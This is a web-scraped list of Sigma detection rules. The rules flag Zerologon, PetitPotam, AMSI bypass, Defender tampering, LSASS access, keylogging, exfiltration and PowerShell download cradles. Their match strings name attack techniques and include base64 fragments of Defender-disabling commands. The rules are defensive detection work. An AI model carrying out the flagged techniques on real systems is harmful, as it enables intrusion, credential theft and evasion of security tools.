<li><a href="#">title:'Possible Zerologon (CVE-2020-1472) Exploitation' id: dd7876d8-0f09-11eb-adc1-0242ac120002 status: experimental description: Detects Netlogon Elevation of Privilege Vulnerability aka Zerologon (CVE-2020-1472) references: - - author: 'Aleksandr Akhremchik, @aleqs4ndr, ocsd.community' date: 2020/10/15 modified: 2021/07/07 tags: - attack.t1068 - attack.privilege_escalation logsource: product: windows service: security detection: selection: EventID: 4742 SubjectUserName: 'ANONYMOUS LOGON' TargetUserName: '%DC-MACHINE-NAME%' # DC machine account name that ends with '$' filter: PasswordLastSet: '-' condition: selection and not filter falsepositives: - Automatic DC computer account password change - Legitimate DC computer account password change level: high 
<li><a href="#">title:Potential PetitPotam Attack Via EFS RPC Calls id: 4096842a-8f9f-4d36-92b4-d0b2a62f9b2a description: | Detects usage of the windows RPC library Encrypting File System Remote Protocol (MS-EFSRPC). Variations of this RPC are used within the attack refereed to as PetitPotam. The usage of this RPC function should be rare if ever used at all. Thus usage of this function is uncommon enough that any usage of this RPC function should warrant further investigation to determine if it is legitimate. View surrounding logs (within a few minutes before and after) from the Source IP to. Logs from from the Source IP would include dce_rpc, smb_mapping, smb_files, rdp, ntlm, kerberos, etc..' status: experimental author: '@neu5ron, @Antonlovesdnb, Mike Remen' date: 2021/08/17 references: - - - - tags: - attack.t1557.001 - attack.t1187 logsource: product: zeek service: dce_rpc detection: selection: operation|startswith: - 'Efs' - 'efs' condition: selection falsepositives: - Uncommon but legitimate windows administrator or software tasks that make use of the Encrypting File System RPC Calls. Verify if this is common activity (see description). level: medium fields: - id.orig_h - id.resp_h - id.resp_p - operation - endpoint - named_pipe - uid 
<li><a href="#">title:Potential RDP Exploit CVE-2019-0708 id: aaa5b30d-f418-420b-83a0-299cb6024885 description: Detect suspicious error on protocol RDP, potential CVE-2019-0708 references: - - tags: - attack.lateral_movement - attack.t1210 - car.2013-07-002 status: experimental author: 'Lionel PRAT, Christophe BROCAS, @atc_project (improvements)' date: 2019/05/24 modified: 2021/10/13 logsource: product: windows service: system detection: selection: EventID: - 56 - 50 Provider_Name: TermDD condition: selection falsepositives: - Bad connections or network interruptions level: medium # too many false positives 
<li><a href="#">title:Potential Remote Desktop Connection to Non-Domain Host id: ce5678bb-b9aa-4fb5-be4b-e57f686256ad status: test description: Detects logons using NTLM to hosts that are potentially not part of the domain. author: James Pemberton references: - n/a date: 2020/05/22 modified: 2021/11/27 logsource: product: windows service: ntlm definition: Requires events from Microsoft-Windows-NTLM/Operational detection: selection: EventID: 8001 TargetName|startswith: TERMSRV condition: selection fields: - Computer - UserName - DomainName - TargetName falsepositives: - Host connections to valid domains, exclude these. - Host connections not using host FQDN. - Host connections to external legitimate domains. level: medium tags: - attack.command_and_control - attack.t1219 
<li><a href="#">title:PowerShell ADRecon Execution id: bf72941a-cba0-41ea-b18c-9aca3925690d status: experimental description: Detects execution of ADRecon.ps1 for AD reconnaissance which has been reported to be actively used by FIN7 references: - - tags: - attack.discovery - attack.execution - attack.t1059.001 author: Bhabesh Raj date: 2021/07/16 modified: 2021/10/16 logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection: ScriptBlockText|contains: - 'Function Get-ADRExcelComOb' - 'ADRecon-Report.xlsx' #Default condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:Powershell AMSI Bypass via .NET Reflection id: 30edb182-aa75-42c0-b0a9-e998bb29067c status: test description: Detects Request to amsiInitFailed that can be used to disable AMSI Scanning author: Markus Neis references: - - date: 2018/08/17 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection1: CommandLine|contains: 'System.Management.Automation.AmsiUtils' selection2: CommandLine|contains: 'amsiInitFailed' condition: selection1 and selection2 falsepositives: - Potential Admin Activity level: high tags: - attack.defense_evasion - attack.t1562.001 
<li><a href="#">title:PowerShell as a Service in Registry id: 4a5f5a5e-ac01-474b-9b4e-d61298c9df1d description: Detects that a powershell code is written to the registry as a service. status: experimental author: oscd.community, Natalia Shornikova date: 2020/10/06 modified: 2022/03/26 references: - logsource: category: registry_set product: windows detection: selection: EventType: SetValue TargetObject|contains: '\Services\' TargetObject|endswith: '\ImagePath' Details|contains: - 'powershell' - 'pwsh' condition: selection falsepositives: - Unknown level: high tags: - attack.execution - attack.t1569.002 
<li><a href="#">title:PowerShell Base64 Encoded Shellcode id: 2d117e49-e626-4c7c-bd1f-c3c0147774c8 status: stable description: Detects Base64 encoded Shellcode author: Florian Roth references: - date: 2018/11/17 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection1: CommandLine|contains: 'AAAAYInlM' selection2: CommandLine|contains: - 'OiCAAAAYInlM' - 'OiJAAAAYInlM' condition: selection1 and selection2 falsepositives: - Unknown level: critical tags: - attack.defense_evasion - attack.t1027 
<li><a href="#">title:PowerShell Called from an Executable Version Mismatch id: c70e019b-1479-4b65-b0cc-cd0c6093a599 status: experimental description: Detects PowerShell called from an executable by the version mismatch method references: - tags: - attack.defense_evasion - attack.execution - attack.t1059.001 author: Sean Metcalf (source), Florian Roth (rule) date: 2017/03/05 modified: 2021/10/16 logsource: product: windows category: ps_classic_start definition: fields have to be extract from event detection: selection1: EngineVersion|startswith: - '2.' - '4.' - '5.' HostVersion|startswith: '3.' condition: selection1 falsepositives: - Unknown level: high 
<li><a href="#">title:Powershell ChromeLoader Browser Hijacker id: 27ba3207-dd30-4812-abbf-5d20c57d474e status: experimental description: Detects PowerShell spawning chrome.exe containing load-extension and AppData\Local in the process command line author: Aedan Russell, frack113 (sigma) references: - - date: 2022/06/19 logsource: category: process_creation product: windows detection: selection: Image|endswith: '\chrome.exe' ParentImage|endswith: '\powershell.exe' CommandLine|contains|all: - '--load-extension=' - '\AppData\Local\' condition: selection falsepositives: - Unknown level: high tags: - attack.persistence - attack.t1176 
<li><a href="#">title:PowerShell Create Local User id: 243de76f-4725-4f2e-8225-a8a69b15ad61 status: experimental description: Detects creation of a local user via PowerShell references: - tags: - attack.execution - attack.t1059.001 - attack.persistence - attack.t1136.001 author: '@ROxPinTeddy' date: 2020/04/11 modified: 2021/10/16 logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection: ScriptBlockText|contains: 'New-LocalUser' condition: selection falsepositives: - Legitimate user creation level: medium 
<li><a href="#">title:Powershell Create Scheduled Task id: 363eccc0-279a-4ccf-a3ab-24c2e63b11fb status: experimental description: Adversaries may abuse the Windows Task Scheduler to perform task scheduling for initial or recurring execution of malicious code references: - - author: frack113 date: 2021/12/28 logsource: product: windows category: ps_script detection: selection_cmdlet: ScriptBlockText|contains: - 'New-ScheduledTaskAction' - 'New-ScheduledTaskTrigger' - 'New-ScheduledTaskPrincipal' - 'New-ScheduledTaskSettingsSet' - 'New-ScheduledTask' - 'Register-ScheduledTask' selection_cimmethod: ScriptBlockText|contains|all: - 'Invoke-CimMethod' - '-ClassName' - 'PS_ScheduledTask' - '-NameSpace' - 'Root\Microsoft\Windows\TaskScheduler' condition: 1 of selection_* falsepositives: - Unknown level: medium tags: - attack.persistence - attack.t1053.005 
<li><a href="#">title:PowerShell Credential Prompt id: ca8b77a9-d499-4095-b793-5d5f330d450e status: experimental description: Detects PowerShell calling a credential prompt references: - - tags: - attack.credential_access - attack.execution - attack.t1059.001 author: John Lambert (idea), Florian Roth (rule) date: 2017/04/09 modified: 2021/10/16 logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection: ScriptBlockText|contains: 'PromptForCredential' condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:PowerShell Decompress Commands id: 1ddc1472-8e52-4f7d-9f11-eab14fc171f5 related: - id: 81fbdce6-ee49-485a-908d-1a728c5dcb09 type: derived description: A General detection for specific decompress commands in PowerShell logs. This could be an adversary decompressing files. status: experimental date: 2020/05/02 modified: 2021/10/16 author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research) tags: - attack.defense_evasion - attack.t1140 references: - - logsource: product: windows category: ps_module definition: PowerShell Module Logging must be enabled detection: selection_4103: Payload|contains: 'Expand-Archive' condition: selection_4103 falsepositives: - Unknown level: informational 
<li><a href="#">title:Powershell Defender Base64 MpPreference id: c6fb44c6-71f5-49e6-9462-1425d328aee3 status: experimental description: Detects base64 encoded PowerShell code that modifies Windows Defender references: - - - tags: - attack.defense_evasion - attack.t1562.001 author: Florian Roth date: 2022/03/04 modified: 2022/03/07 logsource: category: process_creation product: windows detection: selection_encoded: CommandLine|base64offset|contains: - 'Add-MpPreference ' - 'Set-MpPreference ' - 'add-mppreference ' - 'set-mppreference ' CommandLine|contains: # UTF16-LE - 'QQBkAGQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgA' - 'EAZABkAC0ATQBwAFAAcgBlAGYAZQByAGUAbgBjAGUAIA' - 'BAGQAZAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAA' - 'UwBlAHQALQBNAHAAUAByAGUAZgBlAHIAZQBuAGMAZQAgA' - 'MAZQB0AC0ATQBwAFAAcgBlAGYAZQByAGUAbgBjAGUAIA' - 'TAGUAdAAtAE0AcABQAHIAZQBmAGUAcgBlAG4AYwBlACAA' - 'YQBkAGQALQBtAHAAcAByAGUAZgBlAHIAZQBuAGMAZQAgA' - 'EAZABkAC0AbQBwAHAAcgBlAGYAZQByAGUAbgBjAGUAIA' - 'hAGQAZAAtAG0AcABwAHIAZQBmAGUAcgBlAG4AYwBlACAA' - 'cwBlAHQALQBtAHAAcAByAGUAZgBlAHIAZQBuAGMAZQAgA' - 'MAZQB0AC0AbQBwAHAAcgBlAGYAZQByAGUAbgBjAGUAIA' - 'zAGUAdAAtAG0AcABwAHIAZQBmAGUAcgBlAG4AYwBlACAA' condition: selection_encoded falsepositives: - Possible Admin Activity - Other Cmdlets that may use the same parameters level: high 
<li><a href="#">title:Powershell Defender Disable Scan Feature id: 1ec65a5f-9473-4f12-97da-622044d6df21 status: experimental description: Detects requests to disable Microsoft Defender features using PowerShell commands references: - - - tags: - attack.defense_evasion - attack.t1562.001 author: Florian Roth date: 2022/03/03 modified: 2022/03/07 logsource: category: process_creation product: windows detection: selection1: CommandLine|contains: - 'Add-MpPreference ' - 'Set-MpPreference ' selection2: CommandLine|contains: - 'DisableRealtimeMonitoring ' - 'DisableIOAVProtection ' - 'DisableBehaviorMonitoring ' - 'DisableBlockAtFirstSeen ' selection3: CommandLine|contains: - '$true' - ' 1 ' encoded_command: CommandLine|base64offset|contains: - 'DisableRealtimeMonitoring ' - 'DisableIOAVProtection ' - 'DisableBehaviorMonitoring ' - 'DisableBlockAtFirstSeen ' - 'disablerealtimemonitoring ' - 'disableioavprotection ' - 'disablebehaviormonitoring ' - 'disableblockatfirstseen ' CommandLine|contains: - 'RABpAHMAYQBiAGwAZQBSAGUAYQBsAHQAaQBtAGUATQBvAG4AaQB0AG8AcgBpAG4AZwAgA' - 'QAaQBzAGEAYgBsAGUAUgBlAGEAbAB0AGkAbQBlAE0AbwBuAGkAdABvAHIAaQBuAGcAIA' - 'EAGkAcwBhAGIAbABlAFIAZQBhAGwAdABpAG0AZQBNAG8AbgBpAHQAbwByAGkAbgBnACAA' - 'RABpAHMAYQBiAGwAZQBJAE8AQQBWAFAAcgBvAHQAZQBjAHQAaQBvAG4AIA' - 'QAaQBzAGEAYgBsAGUASQBPAEEAVgBQAHIAbwB0AGUAYwB0AGkAbwBuACAA' - 'EAGkAcwBhAGIAbABlAEkATwBBAFYAUAByAG8AdABlAGMAdABpAG8AbgAgA' - 'RABpAHMAYQBiAGwAZQBCAGUAaABhAHYAaQBvAHIATQBvAG4AaQB0AG8AcgBpAG4AZwAgA' - 'QAaQBzAGEAYgBsAGUAQgBlAGgAYQB2AGkAbwByAE0AbwBuAGkAdABvAHIAaQBuAGcAIA' - 'EAGkAcwBhAGIAbABlAEIAZQBoAGEAdgBpAG8AcgBNAG8AbgBpAHQAbwByAGkAbgBnACAA' - 'RABpAHMAYQBiAGwAZQBCAGwAbwBjAGsAQQB0AEYAaQByAHMAdABTAGUAZQBuACAA' - 'QAaQBzAGEAYgBsAGUAQgBsAG8AYwBrAEEAdABGAGkAcgBzAHQAUwBlAGUAbgAgA' - 'EAGkAcwBhAGIAbABlAEIAbABvAGMAawBBAHQARgBpAHIAcwB0AFMAZQBlAG4AIA' - 'ZABpAHMAYQBiAGwAZQByAGUAYQBsAHQAaQBtAGUAbQBvAG4AaQB0AG8AcgBpAG4AZwAgA' - 'QAaQBzAGEAYgBsAGUAcgBlAGEAbAB0AGkAbQBlAG0AbwBuAGkAdABvAHIAaQBuAGcAIA' - 'kAGkAcwBhAGIAbABlAHIAZQBhAGwAdABpAG0AZQBtAG8AbgBpAHQAbwByAGkAbgBnACAA' - 'ZABpAHMAYQBiAGwAZQBpAG8AYQB2AHAAcgBvAHQAZQBjAHQAaQBvAG4AIA' - 'QAaQBzAGEAYgBsAGUAaQBvAGEAdgBwAHIAbwB0AGUAYwB0AGkAbwBuACAA' - 'kAGkAcwBhAGIAbABlAGkAbwBhAHYAcAByAG8AdABlAGMAdABpAG8AbgAgA' - 'ZABpAHMAYQBiAGwAZQBiAGUAaABhAHYAaQBvAHIAbQBvAG4AaQB0AG8AcgBpAG4AZwAgA' - 'QAaQBzAGEAYgBsAGUAYgBlAGgAYQB2AGkAbwByAG0AbwBuAGkAdABvAHIAaQBuAGcAIA' - 'kAGkAcwBhAGIAbABlAGIAZQBoAGEAdgBpAG8AcgBtAG8AbgBpAHQAbwByAGkAbgBnACAA' - 'ZABpAHMAYQBiAGwAZQBiAGwAbwBjAGsAYQB0AGYAaQByAHMAdABzAGUAZQBuACAA' - 'QAaQBzAGEAYgBsAGUAYgBsAG8AYwBrAGEAdABmAGkAcgBzAHQAcwBlAGUAbgAgA' - 'kAGkAcwBhAGIAbABlAGIAbABvAGMAawBhAHQAZgBpAHIAcwB0AHMAZQBlAG4AIA' condition: all of selection* or encoded_command falsepositives: - Possible Admin Activity - Other Cmdlets that may use the same parameters level: high 
<li><a href="#">title:Powershell Defender Exclusion id: 17769c90-230e-488b-a463-e05c08e9d48f status: experimental description: Detects requests to exclude files, folders or processes from Antivirus scanning using PowerShell cmdlets references: - - - tags: - attack.defense_evasion - attack.t1562.001 author: Florian Roth date: 2021/04/29 modified: 2022/05/12 logsource: category: process_creation product: windows detection: selection1: CommandLine|contains: - 'Add-MpPreference ' - 'Set-MpPreference ' selection2: CommandLine|contains: - ' -ExclusionPath ' - ' -ExclusionExtension ' - ' -ExclusionProcess ' - ' -ExclusionIpAddress ' condition: all of selection* falsepositives: - Possible Admin Activity - Other Cmdlets that may use the same parameters level: medium 
<li><a href="#">title:PowerShell Deleted Mounted Share id: 66a4d409-451b-4151-94f4-a55d559c49b0 status: experimental description: Detects when when a mounted share is removed. Adversaries may remove share connections that are no longer useful in order to clean up traces of their operation references: - author: 'oscd.community, @redcanary, Zach Stanford @svch0st' date: 2020/10/08 modified: 2021/10/16 tags: - attack.defense_evasion - attack.t1070.005 logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection: ScriptBlockText|contains: - 'Remove-SmbShare' - 'Remove-FileShare' condition: selection falsepositives: - Administrators or Power users may remove their shares via cmd line level: medium 
<li><a href="#">title:Powershell Detect Virtualization Environment id: d93129cd-1ee0-479f-bc03-ca6f129882e3 status: experimental author: frack113, Duc.Le-GTSC date: 2021/08/03 modified: 2022/03/03 description: Adversaries may employ various system checks to detect and avoid virtualization and analysis environments. This may include changing behaviors based on the results of checks for the presence of artifacts indicative of a virtual machine environment (VME) or sandbox references: - - tags: - attack.defense_evasion - attack.t1497.001 logsource: product: windows category: ps_script definition: EnableScriptBlockLogging must be set to enable detection: selection_action: ScriptBlockText|contains: - Get-WmiObject - gwmi selection_module: ScriptBlockText|contains: - MSAcpi_ThermalZoneTemperature - Win32_ComputerSystem condition: all of selection* falsepositives: - Unknown level: medium 
<li><a href="#">title:Powershell Directory Enumeration id: 162e69a7-7981-4344-84a9-0f1c9a217a52 status: experimental description: Detects technique used by MAZE ransomware to enumerate directories using Powershell date: 2022/03/17 author: frack113 references: - - logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection: ScriptBlockText|contains|all: - foreach - Get-ChildItem - '-Path ' - '-ErrorAction ' - SilentlyContinue - 'Out-File ' - '-append' condition: selection falsepositives: - Legitimate PowerShell scripts level: medium tags: - attack.discovery - attack.t1083 
<li><a href="#">title:Powershell DNSExfiltration id: d59d7842-9a21-4bc6-ba98-64bfe0091355 status: experimental description: DNSExfiltrator allows for transfering (exfiltrate) a file over a DNS request covert channel references: - - author: frack113 date: 2022/01/07 logsource: product: windows category: ps_script definition: 'Script block logging must be enabled' detection: selection_cmdlet: - ScriptBlockText|contains: Invoke-DNSExfiltrator - ScriptBlockText|contains|all: - ' -i ' - ' -d ' - ' -p ' - ' -doh ' - ' -t ' condition: selection_cmdlet falsepositives: - Legitimate script level: high tags: - attack.exfiltration - attack.t1048 
<li><a href="#">title:PowerShell Downgrade Attack id: 6331d09b-4785-4c13-980f-f96661356249 status: experimental description: Detects PowerShell downgrade attack by comparing the host versions with the actually used engine version 2.0 references: - tags: - attack.defense_evasion - attack.execution - attack.t1059.001 author: Florian Roth (rule), Lee Holmes (idea), Harish Segar (improvements) date: 2017/03/22 modified: 2021/10/16 logsource: product: windows category: ps_classic_start definition: fields have to be extract from event detection: selection: EngineVersion|startswith: '2.' filter: HostVersion|startswith: '2.' condition: selection and not filter falsepositives: - Unknown level: medium 
<li><a href="#">title:PowerShell Downgrade Attack id: b3512211-c67e-4707-bedc-66efc7848863 related: - id: 6331d09b-4785-4c13-980f-f96661356249 type: derived status: test description: Detects PowerShell downgrade attack by comparing the host versions with the actually used engine version 2.0 author: Harish Segar (rule) references: - date: 2020/03/20 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: CommandLine|contains: - ' -version 2 ' - ' -versio 2 ' - ' -versi 2 ' - ' -vers 2 ' - ' -ver 2 ' - ' -ve 2 ' Image|endswith: '\powershell.exe' condition: selection falsepositives: - Unknown level: medium tags: - attack.defense_evasion - attack.execution - attack.t1059.001 
<li><a href="#">title:PowerShell Download from URL id: 3b6ab547-8ec2-4991-b9d2-2b06702a48d7 status: test description: Detects a Powershell process that contains download commands in its command line string author: Florian Roth, oscd.community, Jonhnathan Ribeiro date: 2019/01/16 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: Image|endswith: '\powershell.exe' CommandLine|contains|all: - 'new-object' - 'net.webclient).' - 'download' CommandLine|contains: - 'string(' - 'file(' condition: selection fields: - CommandLine - ParentCommandLine falsepositives: - Unknown level: medium tags: - attack.execution - attack.t1059.001 
<li><a href="#">title:PowerShell DownloadFile id: 8f70ac5f-1f6f-4f8e-b454-db19561216c5 status: test description: Detects the execution of powershell, a WebClient object creation and the invocation of DownloadFile in a single command line author: Florian Roth references: - date: 2020/08/28 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: CommandLine|contains|all: - 'powershell' - '.DownloadFile' - 'System.Net.WebClient' condition: selection falsepositives: - Unknown level: high tags: - attack.execution - attack.t1059.001 - attack.command_and_control - attack.t1104 - attack.t1105 
<li><a href="#">title:PowerShell Encoded Character Syntax id: e312efd0-35a1-407f-8439-b8d434b438a6 status: test description: Detects suspicious encoded character syntax often used for defense evasion author: Florian Roth references: - date: 2020/07/09 modified: 2021/11/27 logsource: category: process_creation product: windows detection: selection: CommandLine|contains: '(WCHAR)0x' condition: selection falsepositives: - Unknown level: high tags: - attack.execution - attack.t1059.001 - attack.defense_evasion - attack.t1027 
<li><a href="#">title:Powershell Execute Batch Script id: b5522a23-82da-44e5-9c8b-e10ed8955f88 description: | Adversaries may abuse the Windows command shell for execution. The Windows command shell ([cmd]()) is the primary command prompt on Windows systems. The Windows command prompt can be used to control almost any aspect of a system, with various permission levels required for different subsets of commands. Batch files (ex: .bat or .cmd) also provide the shell with a list of sequential commands to run, as well as normal scripting operations such as conditionals and loops. Common uses of batch files include long or repetitive tasks, or the need to run the same set of commands on multiple system references: - status: experimental author: frack113 date: 2022/01/02 logsource: product: windows category: ps_script detection: selection_start: ScriptBlockText|contains: Start-Process selection_batch: ScriptBlockText|contains: - '.cmd' - '.bat' condition: all of selection_* falsepositives: - Legitimate administration script level: medium tags: - attack.execution - attack.t1059.003 
<li><a href="#">title:Powershell Exfiltration Over SMTP id: 9a7afa56-4762-43eb-807d-c3dc9ffe211b status: experimental description: | Adversaries may steal data by exfiltrating it over an un-encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server. references: - - - author: frack113 date: 2022/01/07 logsource: product: windows category: ps_script definition: 'Script block logging must be enabled' detection: selection_cmdlet: ScriptBlockText|contains: Send-MailMessage condition: selection_cmdlet falsepositives: - Legitimate script level: medium tags: - attack.exfiltration - attack.t1048.003 
<li><a href="#">title:Powershell File and Directory Discovery id: d23f2ba5-9da0-4463-8908-8ee47f614bb9 description: | Adversaries may enumerate files and directories or may search in specific locations of a host or network share for certain information within a file system. Adversaries may use the information from [File and Directory Discovery]() during automated discovery to shape follow-on behaviors, including whether or not the adversary fully infects the target and/or attempts specific actions. references: - status: experimental author: frack113 date: 2021/12/15 logsource: product: windows category: ps_script detection: selection: ScriptBlockText|contains: - ls - get-childitem - gci recurse: ScriptBlockText|contains: '-recurse' condition: selection and recurse falsepositives: - Unknown level: low tags: - attack.discovery - attack.t1083 
<li><a href="#">title:PowerShell Get Clipboard id: 4cbd4f12-2e22-43e3-882f-bff3247ffb78 description: A General detection for the Get-Clipboard commands in PowerShell logs. This could be an adversary capturing clipboard contents. status: experimental date: 2020/05/02 modified: 2022/06/20 author: Roberto Rodriguez (Cyb3rWard0g), OTR (Open Threat Research) tags: - attack.collection - attack.t1115 references: - - logsource: product: windows category: ps_module definition: PowerShell Module Logging must be enabled detection: selection_4103: Payload|contains: 'Get-Clipboard' condition: selection_4103 falsepositives: - Unknown level: medium 
<li><a href="#">title:PowerShell Get-Clipboard Cmdlet Via CLI id: b9aeac14-2ffd-4ad3-b967-1354a4e628c3 related: - id: 4cbd4f12-2e22-43e3-882f-bff3247ffb78 type: derived description: Detects usage of the 'Get-Clipboard' cmdlet via CLI status: experimental date: 2020/05/02 modified: 2021/10/16 author: Nasreddine Bencherchali references: - - logsource: category: process_creation product: windows detection: selection: CommandLine|contains: 'Get-Clipboard' condition: selection falsepositives: - Unknown level: medium tags: - attack.collection - attack.t1115 
<li><a href="#">title:PowerShell Get-Process LSASS id: b2815d0d-7481-4bf0-9b6c-a4c48a94b349 description: Detects a Get-Process command on lsass process, which is in almost all cases a sign of malicious activity status: experimental references: - author: Florian Roth date: 2021/04/23 tags: - attack.credential_access - attack.t1552.004 logsource: category: process_creation product: windows detection: selection: CommandLine|contains: 'Get-Process lsass' condition: selection falsepositives: - Unknown level: high 
<li><a href="#">title:PowerShell Get-Process LSASS in ScriptBlock id: 84c174ab-d3ef-481f-9c86-a50d0b8e3edb status: experimental description: Detects a Get-Process command on lsass process, which is in almost all cases a sign of malicious activity references: - tags: - attack.credential_access - attack.t1003.001 author: Florian Roth date: 2021/04/23 modified: 2021/10/16 logsource: product: windows category: ps_script definition: Script Block Logging must be enabled detection: selection: ScriptBlockText|contains: 'Get-Process lsass' condition: selection falsepositives: - Legitimate certificate exports invoked by administrators or users (depends on processes in the environment - filter if unusable) level: high 
<li><a href="#">title:PowerShell Hotfix Enumeration id: f5d1def8-1de0-4a0e-9794-1f6f27dd605c status: experimental description: Detects call to "Win32_QuickFixEngineering" in order to enumerate installed hotfixes often used in "enum" scripts by attackers author: Nasreddine Bencherchali references: - date: 2022/06/21 logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection: ScriptBlockText|contains|all: - 'Win32_QuickFixEngineering' - 'HotFixID' condition: selection falsepositives: - Legitimate administration scripts level: medium tags: - attack.discovery 
<li><a href="#">title:PowerShell ICMP Exfiltration id: 4c4af3cd-2115-479c-8193-6b8bfce9001c status: experimental description: Detects Exfiltration Over Alternative Protocol - ICMP. Adversaries may steal data by exfiltrating it over an un-encrypted network protocol other than that of the existing command and control channel. references: - author: 'Bartlomiej Czyz @bczyz1, oscd.community' date: 2020/10/10 modified: 2021/10/16 tags: - attack.exfiltration - attack.t1048.003 logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection: ScriptBlockText|contains|all: - 'New-Object' - 'System.Net.NetworkInformation.Ping' - '.Send(' condition: selection falsepositives: - Legitimate usage of System.Net.NetworkInformation.Ping class level: medium 
<li><a href="#">title:Powershell in Windows Run Keys id: 8d85cf08-bf97-4260-ba49-986a2a65129c status: experimental description: Adds a RUN key that contains a powershell keyword references: - author: frack113, Florian Roth date: 2022/03/17 modified: 2022/03/26 logsource: category: registry_set product: windows detection: selection: EventType: SetValue TargetObject|contains: - '\Software\Microsoft\Windows\CurrentVersion\Run' - '\Software\Microsoft\Windows\CurrentVersion\RunOnce' Details|contains: - 'powershell' - 'FromBase64String' - '.DownloadFile(' - '.DownloadString(' - ' -w hidden ' - ' -nop ' - ' -encodedcommand ' condition: selection falsepositives: - Legitimate admin script level: medium tags: - attack.persistence - attack.t1547.001 
<li><a href="#">title:Powershell Install a DLL in System32 id: 63bf8794-9917-45bc-88dd-e1b5abc0ecfd status: experimental description: Uses PowerShell to install a DLL in System32 references: - author: frack113 date: 2021/12/27 logsource: product: windows category: ps_script detection: selection: ScriptBlockText|contains|all: - 'Copy-Item ' - '-Destination ' - '\Windows\System32' condition: selection falsepositives: - Unknown level: high tags: - attack.credential_access - attack.t1556.002 
<li><a href="#">title:Powershell Keylogging id: 34f90d3c-c297-49e9-b26d-911b05a4866c status: experimental author: frack113 date: 2021/07/30 modified: 2021/10/16 description: Adversaries may log user keystrokes to intercept credentials as the user types them. references: - - tags: - attack.collection - attack.t1056.001 logsource: product: windows category: ps_script definition: EnableScriptBlockLogging must be set to enable detection: selection_basic: ScriptBlockText|contains: 'Get-Keystrokes' selection_high: # want to run in background and keyboard ScriptBlockText|contains|all: - 'Get-ProcAddress user32.dll GetAsyncKeyState' - 'Get-ProcAddress user32.dll GetForegroundWindow' condition: selection_basic or selection_high falsepositives: - Unknown level: medium 
<li><a href="#">title:Powershell Local Email Collection id: 2837e152-93c8-43d2-85ba-c3cd3c2ae614 status: experimental author: frack113 date: 2021/07/21 modified: 2021/10/16 description: Adversaries may target user email on local systems to collect sensitive information. Files containing email data can be acquired from a userâ€™s local system, such as Outlook storage or cache files. references: - tags: - attack.collection - attack.t1114.001 logsource: product: windows category: ps_script definition: Script block logging must be enabled detection: selection: ScriptBlockText|contains: - 'Get-Inbox.ps1' - 'Microsoft.Office.Interop.Outlook' - 'Microsoft.Office.Interop.Outlook.olDefaultFolders' - '-comobject outlook.application' condition: selection falsepositives: - Unknown level: medium 
<li><a href="#">title:Powershell LocalAccount Manipulation id: 4fdc44df-bfe9-4fcc-b041-68f5a2d3031c status: experimental description: | Adversaries may manipulate accounts to maintain access to victim systems. Account manipulation may consist of any action that preserves adversary access to a compromised account, such as modifying credentials or permission groups references: - - author: frack113 date: 2021/12/28 logsource: product: windows category: ps_script detection: selection: ScriptBlockText|contains: - 'Disable-LocalUser' - 'Enable-LocalUser' - 'Get-LocalUser' - 'Set-LocalUser' - 'New-LocalUser' - 'Rename-LocalUser' - 'Remove-LocalUser' condition: selection falsepositives: - Legitimate administrative script level: medium tags: - attack.persistence - attack.t1098 
<li><a href="#">title:PowerShell Logging Disabled id: fecfd1a1-cc78-4313-a1ea-2ee2e8ec27a7 description: Detects the modification of the registry of the currently logged in user to disable PowerShell module logging, script block logging or transcription and script execution logging author: frack113 date: 2022/04/02 modified: 2022/06/26 status: experimental references: - logsource: category: registry_set product: windows detection: selection: EventType: SetValue TargetObject|endswith: - SOFTWARE\Policies\Microsoft\Windows\PowerShell\ModuleLogging\EnableModuleLogging - SOFTWARE\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging\EnableScriptBlockLogging - SOFTWARE\Policies\Microsoft\Windows\PowerShell\Transcription\EnableTranscripting - SOFTWARE\Policies\Microsoft\Windows\PowerShell\EnableScripts Details: 'DWORD (0x00000000)' condition: selection falsepositives: - Unknown level: medium tags: - attack.defense_evasion - attack.t1564.001 
<li><a href="#">title:Powershell MsXml COM Object id: 78aa1347-1517-4454-9982-b338d6df8343 status: experimental description: | Adversaries may abuse PowerShell commands and scripts for execution. PowerShell is a powerful interactive command-line interface and scripting environment included in the Windows operating system. (Citation: TechNet PowerShell) Adversaries can use PowerShell to perform a number of actions, including discovery of information and execution of code author: frack113, MatilJ date: 2022/01/19 modified: 2022/05/19 references: - - (v=vs.85) - logsource: product: windows category: ps_script detection: selection: ScriptBlockText|contains|all: - 'New-Object' - '-ComObject' - 'MsXml2.' - 'XmlHttp' condition: selection falsepositives: - Legitimate administrative script level: medium tags: - attack.execution - attack.t1059.001 
<li><a href="#">title:PowerShell Network Connections id: 1f21ec3f-810d-4b0e-8045-322202e22b4b status: experimental description: Detects a Powershell process that opens network connections - check for suspicious target ports and target systems - adjust to your environment (e.g. extend filters with company's ip range') author: Florian Roth date: 2017/03/13 modified: 2022/02/09 references: - tags: - attack.execution - attack.t1059.001 logsource: category: network_connection product: windows detection: selection: Image|endswith: '\powershell.exe' Initiated: 'true' DestinationIsIpv6: 'false' filter: DestinationIp|startswith: - '10.' - '192.168.' - '172.16.' - '172.17.' - '172.18.' - '172.19.' - '172.20.' - '172.21.' - '172.22.' - '172.23.' - '172.24.' - '172.25.' - '172.26.' - '172.27.' - '172.28.' - '172.29.' - '172.30.' - '172.31.' - '127.0.0.1' User|contains: # covers many language settings - 'AUTHORI' - 'AUTORI' condition: selection and not filter falsepositives: - Administrative scripts level: low 
